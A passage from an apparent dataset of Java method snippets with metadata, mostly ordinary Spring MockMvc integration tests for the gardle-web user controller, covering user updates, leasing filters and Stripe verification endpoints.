.andExpect(jsonPath(\"$.firstName\").value(DEFAULT_FIRSTNAME))\n            .andExpect(jsonPath(\"$.lastName\").value(DEFAULT_LASTNAME))\n            .andExpect(jsonPath(\"$.email\").value(DEFAULT_EMAIL))\n            .andExpect(jsonPath(\"$.langKey\").value(DEFAULT_LANGKEY));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33199, "method_name": "getNonExistingUser", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getNonExistingUser() throws Exception {\n        restUserMockMvc.perform(get(\"/api/v1/users/unknown\"))\n            .andExpect(status().isNotFound());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33200, "method_name": "updateUser", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateUser() throws Exception {\n        // Initialize the database\n        userRepository.saveAndFlush(user);\n        int databaseSizeBeforeUpdate = userRepository.findAll().size();\n\n        // Update the user\n        User updatedUser = userRepository.findById(user.getId()).get();\n\n        ManagedUserVM managedUserVM = new ManagedUserVM();\n        managedUserVM.setId(updatedUser.getId());\n        managedUserVM.setLogin(updatedUser.getLogin());\n        managedUserVM.setPassword(UPDATED_PASSWORD);\n        managedUserVM.setFirstName(UPDATED_FIRSTNAME);\n        managedUserVM.setLastName(UPDATED_LASTNAME);\n        managedUserVM.setEmail(UPDATED_EMAIL);\n        managedUserVM.setActivated(updatedUser\n            .isActivated());\n        managedUserVM.setLangKey(UPDATED_LANGKEY);\n        managedUserVM.setCreatedBy(updatedUser.getCreatedBy());\n        managedUserVM.setCreatedDate(updatedUser.getCreatedDate());\n        managedUserVM.setLastModifiedBy(updatedUser.getLastModifiedBy());\n        managedUserVM.setLastModifiedDate(updatedUser.getLastModifiedDate());\n        managedUserVM.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n        managedUserVM.setBankAccountIBAN(DEFAULT_IBAN);\n        restUserMockMvc.perform(put(\"/api/v1/users\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(managedUserVM)))\n            .andExpect(status().isOk());\n\n        // Validate the User in the database\n        List<User> userList = userRepository.findAll();\n        assertThat(userList).hasSize(databaseSizeBeforeUpdate);\n        User testUser = userList.get(userList.size() - 1);\n        assertThat(testUser.getFirstName()).isEqualTo(UPDATED_FIRSTNAME);\n        assertThat(testUser.getLastName()).isEqualTo(UPDATED_LASTNAME);\n        assertThat(testUser.getEmail()).isEqualTo(UPDATED_EMAIL);\n        assertThat(testUser.getLangKey()).isEqualTo(UPDATED_LANGKEY);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33201, "method_name": "updateUserLogin", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateUserLogin() throws Exception {\n        // Initialize the database\n        userRepository.saveAndFlush(user);\n        int databaseSizeBeforeUpdate = userRepository.findAll().size();\n\n        // Update the user\n        User updatedUser = userRepository.findById(user.getId()).get();\n\n        ManagedUserVM managedUserVM = new ManagedUserVM();\n        managedUserVM.setId(updatedUser.getId());\n        managedUserVM.setLogin(UPDATED_LOGIN);\n        managedUserVM.setPassword(UPDATED_PASSWORD);\n        managedUserVM.setFirstName(UPDATED_FIRSTNAME);\n        managedUserVM.setLastName(UPDATED_LASTNAME);\n        managedUserVM.setEmail(UPDATED_EMAIL);\n        managedUserVM.setActivated(updatedUser.isActivated());\n        managedUserVM.setLangKey(UPDATED_LANGKEY);\n        managedUserVM.setCreatedBy(updatedUser.getCreatedBy());\n        managedUserVM.setCreatedDate(updatedUser.getCreatedDate());\n        managedUserVM.setLastModifiedBy(updatedUser.getLastModifiedBy());\n        managedUserVM.setLastModifiedDate(updatedUser.getLastModifiedDate());\n        managedUserVM.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n        managedUserVM.setBankAccountIBAN(DEFAULT_IBAN);\n\n        restUserMockMvc.perform(put(\"/api/v1/users\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(managedUserVM)))\n            .andExpect(status().isOk());\n\n        // Validate the User in the database\n        List<User> userList = userRepository.findAll();\n        assertThat(userList).hasSize(databaseSizeBeforeUpdate);\n        User testUser = userList.get(userList.size() - 1);\n        assertThat(testUser.getLogin()).isEqualTo(UPDATED_LOGIN);\n        assertThat(testUser.getFirstName()).isEqualTo(UPDATED_FIRSTNAME);\n        assertThat(testUser.getLastName()).isEqualTo(UPDATED_LASTNAME);\n        assertThat(testUser.getEmail()).isEqualTo(UPDATED_EMAIL);\n        assertThat(testUser.getLangKey()).isEqualTo(UPDATED_LANGKEY);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33202, "method_name": "updateUserExistingEmail", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateUserExistingEmail() throws Exception {\n        // Initialize the database with 2 users\n        userRepository.saveAndFlush(user);\n\n        User anotherUser = new User();\n        anotherUser.setLogin(\"jhipster\");\n        anotherUser.setPassword(RandomStringUtils.random(60));\n        anotherUser.setActivated(true);\n        anotherUser.setEmail(\"jhipster@localhost\");\n        anotherUser.setFirstName(\"java\");\n        anotherUser.setLastName(\"hipster\");\n        anotherUser.setLangKey(\"en\");\n        anotherUser.setBankAccountIBAN(DEFAULT_IBAN);\n        userRepository.saveAndFlush(anotherUser);\n\n        // Update the user\n        User updatedUser = userRepository.findById(user.getId()).get();\n\n        ManagedUserVM managedUserVM = new ManagedUserVM();\n        managedUserVM.setId(updatedUser.getId());\n        managedUserVM.setLogin(updatedUser.getLogin());\n        managedUserVM.setPassword(updatedUser.getPassword());\n        managedUserVM.setFirstName(updatedUser.getFirstName());\n        managedUserVM.setLastName(updatedUser.getLastName());\n        managedUserVM.setEmail(\"jhipster@localhost\");// this email should already be used by anotherUser\n        managedUserVM.setActivated(updatedUser.isActivated());\n        managedUserVM.setLangKey(updatedUser.getLangKey());\n        managedUserVM.setCreatedBy(updatedUser.getCreatedBy());\n        managedUserVM.setCreatedDate(updatedUser.getCreatedDate());\n        managedUserVM.setLastModifiedBy(updatedUser.getLastModifiedBy());\n        managedUserVM.setLastModifiedDate(updatedUser.getLastModifiedDate());\n        managedUserVM.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n        managedUserVM.setBankAccountIBAN(DEFAULT_IBAN);\n\n        restUserMockMvc.perform(put(\"/api/v1/users\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(managedUserVM)))\n            .andExpect(status().isConflict());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33203, "method_name": "updateUserExistingLogin", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateUserExistingLogin() throws Exception {\n        // Initialize the database\n        userRepository.saveAndFlush(user);\n\n        User anotherUser = new User();\n        anotherUser.setLogin(\"jhipster\");\n        anotherUser.setPassword(RandomStringUtils.random(60));\n        anotherUser.setActivated(true);\n        anotherUser.setEmail(\"jhipster@localhost\");\n        anotherUser.setFirstName(\"java\");\n        anotherUser.setLastName(\"hipster\");\n        anotherUser.setLangKey(\"en\");\n        anotherUser.setBankAccountIBAN(DEFAULT_IBAN);\n        userRepository.saveAndFlush(anotherUser);\n\n        // Update the user\n        User updatedUser = userRepository.findById(user.getId()).get();\n\n        ManagedUserVM managedUserVM = new ManagedUserVM();\n        managedUserVM.setId(updatedUser.getId());\n        managedUserVM.setLogin(\"jhipster\");// this login should already be used by anotherUser\n        managedUserVM.setPassword(updatedUser.getPassword());\n        managedUserVM.setFirstName(updatedUser.getFirstName());\n        managedUserVM.setLastName(updatedUser.getLastName());\n        managedUserVM.setEmail(updatedUser.getEmail());\n        managedUserVM.setActivated(updatedUser.isActivated());\n        managedUserVM.setLangKey(updatedUser.getLangKey());\n        managedUserVM.setCreatedBy(updatedUser.getCreatedBy());\n        managedUserVM.setCreatedDate(updatedUser.getCreatedDate());\n        managedUserVM.setLastModifiedBy(updatedUser.getLastModifiedBy());\n        managedUserVM.setLastModifiedDate(updatedUser.getLastModifiedDate());\n        managedUserVM.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n        managedUserVM.setBankAccountIBAN(DEFAULT_IBAN);\n\n        restUserMockMvc.perform(put(\"/api/v1/users\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(managedUserVM)))\n            .andExpect(status().isConflict());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33204, "method_name": "deleteUser", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void deleteUser() throws Exception {\n        // Initialize the database\n        userRepository.saveAndFlush(user);\n        int databaseSizeBeforeDelete = userRepository.findAll().size();\n\n        // Delete the user\n        restUserMockMvc.perform(delete(\"/api/v1/users/{login}\", user.getLogin())\n            .accept(TestUtil.APPLICATION_JSON_UTF8))\n            .andExpect(status().isNoContent());\n\n        // Validate the database is empty\n        List<User> userList = userRepository.findAll();\n        assertThat(userList).hasSize(databaseSizeBeforeDelete - 1);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33205, "method_name": "testUserEquals", "class_name": "UserControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testUserEquals() {\n        User user1 = new User();\n        user1.setId(1L);\n        User user2 = new User();\n        user2.setId(user1.getId());\n        assertThat(user1).isEqualTo(user2);\n        user2.setId(2L);\n        assertThat(user1).isNotEqualTo(user2);\n        user1.setId(null);\n        assertThat(user1).isNotEqualTo(user2);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33206, "method_name": "testUserDTOtoUser", "class_name": "UserControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testUserDTOtoUser() {\n        UserDTO userDTO = new UserDTO();\n        userDTO.setId(DEFAULT_ID);\n        userDTO.setLogin(DEFAULT_LOGIN);\n        userDTO.setFirstName(DEFAULT_FIRSTNAME);\n        userDTO.setLastName(DEFAULT_LASTNAME);\n        userDTO.setEmail(DEFAULT_EMAIL);\n        userDTO.setActivated(true);\n        userDTO.setLangKey(DEFAULT_LANGKEY);\n        userDTO.setCreatedBy(DEFAULT_LOGIN);\n        userDTO.setLastModifiedBy(DEFAULT_LOGIN);\n        userDTO.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n\n        User user = userMapper.userDTOToUser(userDTO);\n        assertThat(user.getId()).isEqualTo(DEFAULT_ID);\n        assertThat(user.getLogin()).isEqualTo(DEFAULT_LOGIN);\n        assertThat(user.getFirstName()).isEqualTo(DEFAULT_FIRSTNAME);\n        assertThat(user.getLastName()).isEqualTo(DEFAULT_LASTNAME);\n        assertThat(user.getEmail()).isEqualTo(DEFAULT_EMAIL);\n        assertThat(user.isActivated()).isEqualTo(true);\n        assertThat(user.getLangKey()).isEqualTo(DEFAULT_LANGKEY);\n        assertThat(user.getCreatedBy()).isNull();\n        assertThat(user.getCreatedDate()).isNotNull();\n        assertThat(user.getLastModifiedBy()).isNull();\n        assertThat(user.getLastModifiedDate()).isNotNull();\n        assertThat(user.getAuthorities()).extracting(\"name\").containsExactly(AuthoritiesConstants.USER);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33207, "method_name": "testUserToUserDTO", "class_name": "UserControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testUserToUserDTO() {\n        user.setId(DEFAULT_ID);\n        user.setCreatedBy(DEFAULT_LOGIN);\n        user.setCreatedDate(Instant.now());\n        user.setLastModifiedBy(DEFAULT_LOGIN);\n        user.setLastModifiedDate(Instant.now());\n        Set<Authority> authorities = new HashSet<>();\n        Authority authority = new Authority();\n        authority.setName(AuthoritiesConstants.USER);\n        authorities.add(authority);\n        user.setAuthorities(authorities);\n\n        UserDTO userDTO = userMapper.userToUserDTO(user);\n\n        assertThat(userDTO.getId()).isEqualTo(DEFAULT_ID);\n        assertThat(userDTO.getLogin()).isEqualTo(DEFAULT_LOGIN);\n        assertThat(userDTO.getFirstName()).isEqualTo(DEFAULT_FIRSTNAME);\n        assertThat(userDTO.getLastName()).isEqualTo(DEFAULT_LASTNAME);\n        assertThat(userDTO.getEmail()).isEqualTo(DEFAULT_EMAIL);\n        assertThat(userDTO.isActivated()).isEqualTo(true);\n        assertThat(userDTO.getLangKey()).isEqualTo(DEFAULT_LANGKEY);\n        assertThat(userDTO.getCreatedBy()).isEqualTo(DEFAULT_LOGIN);\n        assertThat(userDTO.getCreatedDate()).isEqualTo(user.getCreatedDate());\n        assertThat(userDTO.getLastModifiedBy()).isEqualTo(DEFAULT_LOGIN);\n        assertThat(userDTO.getLastModifiedDate()).isEqualTo(user.getLastModifiedDate());\n        assertThat(userDTO.getAuthorities()).containsExactly(AuthoritiesConstants.USER);\n        assertThat(userDTO.toString()).isNotNull();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33208, "method_name": "testAuthorityEquals", "class_name": "UserControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testAuthorityEquals() {\n        Authority authorityA = new Authority();\n        assertThat(authorityA).isEqualTo(authorityA);\n        assertThat(authorityA).isNotEqualTo(null);\n        assertThat(authorityA).isNotEqualTo(new Object());\n        assertThat(authorityA.hashCode()).isEqualTo(0);\n        assertThat(authorityA.toString()).isNotNull();\n\n        Authority authorityB = new Authority();\n        assertThat(authorityA).isEqualTo(authorityB);\n\n        authorityB.setName(AuthoritiesConstants.ADMIN);\n        assertThat(authorityA).isNotEqualTo(authorityB);\n\n        authorityA.setName(AuthoritiesConstants.USER);\n        assertThat(authorityA).isNotEqualTo(authorityB);\n\n        authorityB.setName(AuthoritiesConstants.USER);\n        assertThat(authorityA).isEqualTo(authorityB);\n        assertThat(authorityA.hashCode()).isEqualTo(authorityB.hashCode());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33209, "method_name": "getLeasingsForUser", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getLeasingsForUser() throws Exception {\n        User user2 = createEntity(null);\n        user2.setLogin(\"user2\");\n        user2.setEmail(\"user2@gardle.ga\");\n\n        userRepository.save(user);\n        userRepository.save(user2);\n\n        GardenField gardenField = createGardenField();\n\n        Leasing leasing1 = new Leasing();\n        leasing1.setUser(user);\n        leasing1.setGardenField(gardenField);\n        leasing1.setFrom(Instant.now().plus(10, ChronoUnit.DAYS));\n        leasing1.setTo(Instant.now().plus(20, ChronoUnit.DAYS));\n        leasing1.setStatus(LeasingStatus.RESERVED);\n        leasing1.setPaymentSessionId(DEFAULT_PAYMENT_SESSION_ID);\n        leasingRepository.save(leasing1);\n\n        Leasing leasing2 = new Leasing();\n        leasing2.setUser(user2);\n        leasing2.setGardenField(gardenField);\n        leasing2.setFrom(Instant.now().plus(21, ChronoUnit.DAYS));\n        leasing2.setTo(Instant.now().plus(30, ChronoUnit.DAYS));\n        leasing2.setStatus(LeasingStatus.RESERVED);\n        leasing2.setPaymentSessionId(DEFAULT_PAYMENT_SESSION_ID);\n        leasingRepository.save(leasing2);\n\n        Leasing leasing3 = new Leasing();\n        leasing3.setUser(user);\n        leasing3.setGardenField(gardenField);\n        leasing3.setFrom(Instant.now().plus(31, ChronoUnit.DAYS));\n        leasing3.setTo(Instant.now().plus(40, ChronoUnit.DAYS));\n        leasing3.setStatus(LeasingStatus.RESERVED);\n        leasing3.setPaymentSessionId(DEFAULT_PAYMENT_SESSION_ID);\n        leasingRepository.save(leasing3);\n\n        assertThat(leasingRepository.findAll()).hasSize(3);\n\n        restUserMockMvc.perform(get(\"/api/v1/users/{userId}/leasings\", user.getId()))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.content.length()\").value(is(2)))\n            .andExpect(jsonPath(\"$.content.[0].id\").value(is(leasing1.getId().intValue())))\n            .andExpect(jsonPath(\"$.content.[1].id\").value(is(leasing3.getId().intValue())));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33210, "method_name": "getLeasingsForUserWithStatusFilter", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getLeasingsForUserWithStatusFilter() throws Exception {\n        User user2 = createEntity(null);\n        user2.setLogin(\"user2\");\n        user2.setEmail(\"user2@gardle.ga\");\n\n        userRepository.save(user);\n\n        GardenField gardenField = createGardenField();\n\n        Leasing leasing1 = new Leasing();\n        leasing1.setUser(user);\n        leasing1.setGardenField(gardenField);\n        leasing1.setFrom(Instant.now().plus(10, ChronoUnit.DAYS));\n        leasing1.setTo(Instant.now().plus(20, ChronoUnit.DAYS));\n        leasing1.setStatus(LeasingStatus.OPEN);\n        leasing1.setPaymentSessionId(DEFAULT_PAYMENT_SESSION_ID);\n        leasingRepository.save(leasing1);\n\n        Leasing leasing2 = new Leasing();\n        leasing2.setUser(user);\n        leasing2.setGardenField(gardenField);\n        leasing2.setFrom(Instant.now().plus(21, ChronoUnit.DAYS));\n        leasing2.setTo(Instant.now().plus(30, ChronoUnit.DAYS));\n        leasing2.setStatus(LeasingStatus.RESERVED);\n        leasing2.setPaymentSessionId(DEFAULT_PAYMENT_SESSION_ID);\n        leasingRepository.save(leasing2);\n\n        Leasing leasing3 = new Leasing();\n        leasing3.setUser(user);\n        leasing3.setGardenField(gardenField);\n        leasing3.setFrom(Instant.now().plus(31, ChronoUnit.DAYS));\n        leasing3.setTo(Instant.now().plus(40, ChronoUnit.DAYS));\n        leasing3.setStatus(LeasingStatus.CANCELLED);\n        leasing3.setPaymentSessionId(DEFAULT_PAYMENT_SESSION_ID);\n        leasingRepository.save(leasing3);\n\n        assertThat(leasingRepository.findAll()).hasSize(3);\n\n        restUserMockMvc.perform(get(\"/api/v1/users/{userId}/leasings?leasingStatus=\" + LeasingStatus.OPEN.toString()\n            + \"&leasingStatus=\" + LeasingStatus.CANCELLED, user.getId()))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.content.length()\").value(is(2)))\n            .andExpect(jsonPath(\"$.content.[0].id\").value(is(leasing1.getId().intValue())))\n            .andExpect(jsonPath(\"$.content.[1].id\").value(is(leasing3.getId().intValue())));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33211, "method_name": "getLeasingsForUserWithStatusAndToFilter", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getLeasingsForUserWithStatusAndToFilter() throws Exception {\n        userRepository.save(user);\n\n        GardenField gardenField = createGardenField();\n\n        Leasing leasing1 = new Leasing();\n        leasing1.setUser(user);\n        leasing1.setGardenField(gardenField);\n        leasing1.setFrom(Instant.now().plus(10, ChronoUnit.DAYS));\n        leasing1.setTo(Instant.now().plus(20, ChronoUnit.DAYS));\n        leasing1.setStatus(LeasingStatus.OPEN);\n        leasing1.setPaymentSessionId(DEFAULT_PAYMENT_SESSION_ID);\n        leasingRepository.save(leasing1);\n\n        Leasing leasing2 = new Leasing();\n        leasing2.setUser(user);\n        leasing2.setGardenField(gardenField);\n        leasing2.setFrom(Instant.now().plus(21, ChronoUnit.DAYS));\n        leasing2.setTo(Instant.now().plus(30, ChronoUnit.DAYS));\n        leasing2.setStatus(LeasingStatus.OPEN);\n        leasing2.setPaymentSessionId(DEFAULT_PAYMENT_SESSION_ID);\n        leasingRepository.save(leasing2);\n\n        Leasing leasing3 = new Leasing();\n        leasing3.setUser(user);\n        leasing3.setGardenField(gardenField);\n        leasing3.setFrom(Instant.now().plus(31, ChronoUnit.DAYS));\n        leasing3.setTo(Instant.now().plus(40, ChronoUnit.DAYS));\n        leasing3.setStatus(LeasingStatus.OPEN);\n        leasing3.setPaymentSessionId(DEFAULT_PAYMENT_SESSION_ID);\n        leasingRepository.save(leasing3);\n\n        assertThat(leasingRepository.findAll()).hasSize(3);\n\n        restUserMockMvc.perform(get(\"/api/v1/users/{userId}/leasings?leasingStatus=\" + LeasingStatus.OPEN.toString()\n            + \"&to=\" + leasing2.getTo().plus(1, ChronoUnit.SECONDS), user.getId()))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.content.length()\").value(is(2)))\n            .andExpect(jsonPath(\"$.content.[0].id\").value(is(leasing1.getId().intValue())))\n            .andExpect(jsonPath(\"$.content.[1].id\").value(is(leasing2.getId().intValue())));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33212, "method_name": "getLeasingsForUserWithStateFilter", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getLeasingsForUserWithStateFilter() throws Exception {\n        User user2 = createEntity(null);\n        user2.setLogin(\"user2\");\n        user2.setEmail(\"user2@gardle.ga\");\n\n        userRepository.save(user);\n\n        GardenField gardenField = createGardenField();\n\n        Leasing leasing1 = new Leasing();\n        leasing1.setUser(user);\n        leasing1.setGardenField(gardenField);\n        leasing1.setFrom(Instant.now().plus(10, ChronoUnit.DAYS));\n        leasing1.setTo(Instant.now().plus(20, ChronoUnit.DAYS));\n        leasing1.setStatus(LeasingStatus.OPEN);\n        leasing1.setPaymentSessionId(DEFAULT_PAYMENT_SESSION_ID);\n        leasingRepository.save(leasing1);\n\n        Leasing leasing2 = new Leasing();\n        leasing2.setUser(user);\n        leasing2.setGardenField(gardenField);\n        leasing2.setFrom(Instant.now().plus(21, ChronoUnit.DAYS));\n        leasing2.setTo(Instant.now().plus(30, ChronoUnit.DAYS));\n        leasing2.setStatus(LeasingStatus.OPEN);\n        leasing2.setPaymentSessionId(DEFAULT_PAYMENT_SESSION_ID);\n        leasingRepository.save(leasing2);\n\n        Leasing leasing3 = new Leasing();\n        leasing3.setUser(user);\n        leasing3.setGardenField(gardenField);\n        leasing3.setFrom(Instant.now().minus(50, ChronoUnit.DAYS));\n        leasing3.setTo(Instant.now().minus(10, ChronoUnit.DAYS));\n        leasing3.setStatus(LeasingStatus.OPEN);\n        leasing3.setPaymentSessionId(DEFAULT_PAYMENT_SESSION_ID);\n        leasingRepository.save(leasing3);\n\n        assertThat(leasingRepository.findAll()).hasSize(3);\n\n        restUserMockMvc.perform(get(\"/api/v1/users/{userId}/leasings?state=\" + LeasingState.FUTURE.toString(), user.getId()))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.content.length()\").value(is(2)))\n            .andExpect(jsonPath(\"$.content.[0].id\").value(is(leasing1.getId().intValue())))\n            .andExpect(jsonPath(\"$.content.[1].id\").value(is(leasing2.getId().intValue())));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33213, "method_name": "createGardenField", "class_name": "UserControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GardenField", "snippet": "    public GardenField createGardenField() {\n        GardenField gardenField = new GardenField();\n        gardenField.setName(\"testGarden\");\n        gardenField.setSizeInM2(10.0);\n        gardenField.setPricePerM2(3.0);\n        gardenField.setLatitude(1.0);\n        gardenField.setLongitude(2.0);\n        gardenField.setCity(\"testCity\");\n        gardenField.setOwner(user);\n        return gardenFieldRepository.save(gardenField);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33214, "method_name": "updateStripeAccountVerification", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateStripeAccountVerification() throws Exception {\n        String stripeVerificationKey = RandomUtil.generateStripeVerificationKey();\n        user.setStripeVerificationKey(stripeVerificationKey);\n        userRepository.saveAndFlush(user);\n\n        UpdateStripeAccountVerifiedUserDTO updateStripeAccountVerifiedUserDTO = new UpdateStripeAccountVerifiedUserDTO(true, stripeVerificationKey);\n\n        restUserMockMvc.perform(put(\"/api/v1/users/stripeVerification\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(updateStripeAccountVerifiedUserDTO)))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.id\").value(is(Math.toIntExact(user.getId()))))\n            .andExpect(jsonPath(\"$.stripeAccountVerified\")\n                .value(is(updateStripeAccountVerifiedUserDTO.getVerified())));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33215, "method_name": "updateStripeAccountVerificationUnauthorized", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateStripeAccountVerificationUnauthorized() throws Exception {\n        String stripeVerificationKey = RandomUtil.generateStripeVerificationKey();\n        user.setStripeVerificationKey(stripeVerificationKey);\n        userRepository.saveAndFlush(user);\n\n        UpdateStripeAccountVerifiedUserDTO updateStripeAccountVerifiedUserDTO = new UpdateStripeAccountVerifiedUserDTO(true, stripeVerificationKey);\n\n        restUserMockMvc.perform(put(\"/api/v1/users/stripeVerification\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(updateStripeAccountVerifiedUserDTO)))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isUnauthorized());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33216, "method_name": "updateStripeAccountVerificationForbidden", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateStripeAccountVerificationForbidden() throws Exception {\n        String stripeVerificationKey = RandomUtil.generateStripeVerificationKey();\n        user.setStripeVerificationKey(stripeVerificationKey);\n        userRepository.saveAndFlush(user);\n\n        UpdateStripeAccountVerifiedUserDTO updateStripeAccountVerifiedUserDTO = new UpdateStripeAccountVerifiedUserDTO(true, \"someString\");\n\n        restUserMockMvc.perform(put(\"/api/v1/users/stripeVerification\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(updateStripeAccountVerifiedUserDTO)))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isForbidden());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33217, "method_name": "notifyDataSetChanged", "class_name": "CommonNavigator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void 